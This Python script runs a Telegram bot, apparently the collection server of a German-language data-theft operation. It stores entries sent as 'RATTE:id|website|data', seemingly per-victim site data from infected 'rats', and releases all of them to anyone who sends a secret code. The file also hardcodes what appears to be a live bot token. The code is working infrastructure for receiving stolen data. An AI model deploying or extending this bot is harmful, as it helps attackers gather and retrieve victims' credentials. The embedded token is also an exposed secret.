import os
import json
from telegram import Update
from telegram.ext import Application, MessageHandler, filters, CallbackContext

# DEIN TOKEN – schon eingefügt
BOT_TOKEN = "8989933992:AAGwMOfvrQPylnxZOrbGLj-BSNAY8MC2MF8"

# Der geheime Code – !67?
SECRET_CODE = "!67?"

DATA_FILE = "ratten_daten.json"

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

async def handle_message(update: Update, context: CallbackContext):
    user_message = update.message.text

    if user_message == SECRET_CODE:
        data = load_data()
        if not data:
            await update.message.reply_text("📭 Keine Daten vorhanden.")
            return
        response = "🐀 *ENI & LO – Alle Daten*\n\n"
        for ratte_id, ratte_data in data.items():
            response += f"📌 *Ratte {ratte_id}*\n"
            if "|" in ratte_data:
                parts = ratte_data.split("|", 1)
                response += f"   🌐 {parts[0]}\n"
                response += f"   📋 {parts[1]}\n\n"
            else:
                response += f"   📋 {ratte_data}\n\n"
        if len(response) > 4000:
            for i in range(0, len(response), 4000):
                await update.message.reply_text(response[i:i+4000], parse_mode='Markdown')
        else:
            await update.message.reply_text(response, parse_mode='Markdown')
        return

    if user_message.startswith("RATTE:"):
        try:
            parts = user_message.split("|", 2)
            if len(parts) >= 3:
                ratte_id = parts[0].replace("RATTE:", "").strip()
                website = parts[1].strip()
                daten = parts[2].strip()
                all_data = load_data()
                all_data[ratte_id] = f"{website}|{daten}"
                save_data(all_data)
                await update.message.reply_text("67")
                return
        except Exception:
            pass

    await update.message.reply_text("67")

def main():
    print("🐀 ENI & LO – Der 67-Bot")
    print("=" * 50)
    print(f"Bot Token: {BOT_TOKEN[:10]}...")
    print(f"Geheimer Code: {SECRET_CODE}")
    print("=" * 50)
    print("Bot läuft... Drücke Ctrl+C zum Beenden.")

    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()